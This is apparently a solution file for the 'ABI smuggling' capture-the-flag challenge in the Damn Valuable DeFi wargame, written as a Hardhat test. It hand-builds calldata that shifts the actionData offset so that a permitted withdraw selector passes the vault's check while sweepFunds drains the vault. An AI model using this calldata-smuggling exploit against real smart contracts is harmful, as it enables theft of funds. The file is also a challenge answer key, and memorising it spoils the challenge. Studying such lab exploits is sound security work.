const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    /**
     * @dev
     * Exploit overview
     * 
     * The exploit in this challenge is when
     * the AuthorizedExecutor retrieves the selector from the actionData
     * parameter. Because it is using a hardcoded calldata offset and the 
     * actionData parameter is a dynamic type of bytes, we can change the offset
     * of the actionData parameter to be further along the calldata and put the
     * dummy funcsig in it's place.
     * 
     * We can pass the check and still call any function with any data.
     * 
     * Essentially our calldata will look like
     * 
     * 0x00: execute() funcsig
     * 0x04: address of vault
     * 0x24: actionData offset (we manipulate this)
     * 0x44: Empty bytes (this is where actionData length should be) 
     * 0x64: withdrawFunds() funcsig (this is where selector is read from)
     * 0x84: actionData length (new offset will point to this address)
     * 0xA4: sweepFunds() funcsig 
     * 0xA8: recovery address
     * 0xC8: token address
     * 
     */
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        //  Deployer can sweep
        expect(vault.interface.getSighash("sweepFunds"), "0x85fb709d");
        //  Player can withdraw
        expect(vault.interface.getSighash("withdraw"), "0xd9caed12");

        // Connect to challenge contracts
       const attackVault = await vault.connect(player);
       const attackToken = await token.connect(player);

        // Create components of calldata

        const executeFs = vault.interface.getSighash("execute")
        const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
        // Modified offset to be 4 * 32 bytes from after the function selector
        const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); 
        const withdrawSelector =  vault.interface.getSighash("withdraw").slice(2);
        // Length of actionData calldata (1 * 4) + (2 * 32) Bytes
        const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)
        // actionData actual data: FS + address + address
        const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);
        const sweepFundsData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)
                     + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 

        const payload = executeFs + 
                        target + 
                        bytesLocation + 
                        ethers.utils.hexZeroPad("0x0", 32).slice(2) +
                        withdrawSelector + ethers.utils.hexZeroPad("0x0", 28).slice(2) +
                        bytesLength + 
                        sweepSelector + 
                        sweepFundsData 
        
        console.log("Payload:")
        console.log(payload);

        await player.sendTransaction(
            {
                to: attackVault.address,
                data: payload,
            }
        )
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
